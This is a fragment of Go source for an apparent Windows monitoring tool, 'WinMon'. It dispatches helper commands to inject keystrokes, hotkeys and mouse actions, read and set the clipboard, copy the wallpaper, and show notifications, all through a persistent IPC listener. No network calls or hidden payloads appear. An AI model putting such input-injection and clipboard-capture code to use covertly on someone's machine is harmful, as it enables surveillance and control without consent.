		return audio.SpeakTTS(args)
	case "/playsound":
		return audio.PlaySoundLocal(args)
	case "/setwallpaper":
		return display.SetWallpaperLocal(args)
	case "/wallpaper":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_wallpaper.jpg")
		path, err := display.GetWallpaperPath()
		if err != nil {
			return err
		}
		in, err := os.Open(path)
		if err != nil {
			return err
		}
		defer in.Close()
		out, err := os.Create(tempPath)
		if err != nil {
			return err
		}
		defer out.Close()
		_, err = io.Copy(out, in)
		return err
	case "/notify":
		parts := strings.Split(args, "|")
		title := "WinMon Notification"
		msg := args
		if len(parts) > 1 {
			title = parts[0]
			msg = parts[1]
		}
		return notifications.ShowToastLocal(title, msg)
	case "/type":
		inputText := strings.ReplaceAll(args, "\\\"", "\"")
		input.TypeText(inputText)
		return nil
	case "/keypress":
		return input.PressKey(args)
	case "/hotkey":
		return input.TriggerHotkey(args)
	case "/mouse":
		fields := strings.Fields(args)
		if len(fields) < 1 {
			return fmt.Errorf("invalid mouse action")
		}
		action := fields[0]
		switch action {
		case "move":
			if len(fields) < 3 {
				return fmt.Errorf("usage: move <x> <y>")
			}
			x, _ := strconv.Atoi(fields[1])
			y, _ := strconv.Atoi(fields[2])
			return input.MoveMouse(x, y)
		case "click":
			input.ClickMouse()
		case "rightclick":
			input.RightClickMouse()
		case "doubleclick":
			input.DoubleClickMouse()
		case "scroll":
			if len(fields) < 2 {
				return fmt.Errorf("usage: scroll <amount>")
			}
			amount, _ := strconv.Atoi(fields[1])
			input.ScrollMouse(amount)
		}
		return nil
	case "/clipboard":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
		txt, err := clipboard.GetClipboardLocal()
		if err != nil {
			return err
		}
		return os.WriteFile(tempPath, []byte(txt), 0644)
	case "/setclipboard":
		return clipboard.SetClipboardLocal(args)
	case "/brightness":
		bri, err := strconv.Atoi(args)
		if err != nil {
			return fmt.Errorf("brightness must be an integer: %w", err)
		}
		return display.SetBrightness(bri)
	}

	return fmt.Errorf("unsupported helper command: %s", cmd)
}

func parseDuration(arg string) time.Duration {
	d, err := strconv.Atoi(strings.TrimSpace(arg))
	if err != nil || d <= 0 {
		return 5 * time.Second
	}
	return time.Duration(d) * time.Second
}

// RunSessionAgentLoop runs the persistent IPC listener in Session 1
func RunSessionAgentLoop() error {
	log.Println("Starting WinMon Persistent Session Agent (Session 1 IPC Listener)...")
	return service.StartIPCAgentServer(func(req service.IPCRequest) service.IPCResponse {
		err := RunSessionHelper(req.Cmd, req.FlatArgs)
		if err != nil {
			return service.IPCResponse{
				Success: false,
				Error:   err.Error(),
			}
		}
		return service.IPCResponse{
			Success: true,
		}
	})
}
